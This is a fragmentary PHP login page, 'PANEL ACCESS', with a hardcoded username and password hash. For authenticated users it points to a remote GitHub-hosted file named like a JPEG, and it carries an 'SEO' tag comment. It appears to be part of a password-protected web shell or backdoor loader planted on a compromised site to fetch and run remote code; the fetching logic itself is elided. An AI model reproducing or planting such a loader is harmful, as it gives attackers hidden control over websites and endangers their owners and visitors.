...
$username = "mantapjiwa";
$passwordHash = '$2b$10$E7Ik9gMv6LOVXbFKmLfKPO9W1gcw80ElRf1zJMfemJoW10nAVqkAK';
...
if (is_logged_in()) {
    $destiny = 'https://raw.githubusercontent.com/nagaemasbumi/ku/refs/heads/main/kuyangsolo.jpg';
...
if (!is_logged_in()) {
    ...
    <head>
        ...
        <style>
            * {
            ...
            body {
                background: url('https://spookyshort.store/images/2026/03/12/aaa.jpg') no-repeat center center fixed;
    ...
    </head>   <!-- SEO NaGAeMAsbUmi -->
        <body>
        <div class="form-container">
            <div class="login-form">
                <img src="https://spookyshort.store/images/2026/03/12/solo.gif" alt="Logo">
                <h2>PANEL ACCESS</h2>
                <?php if (isset($error)): ?>
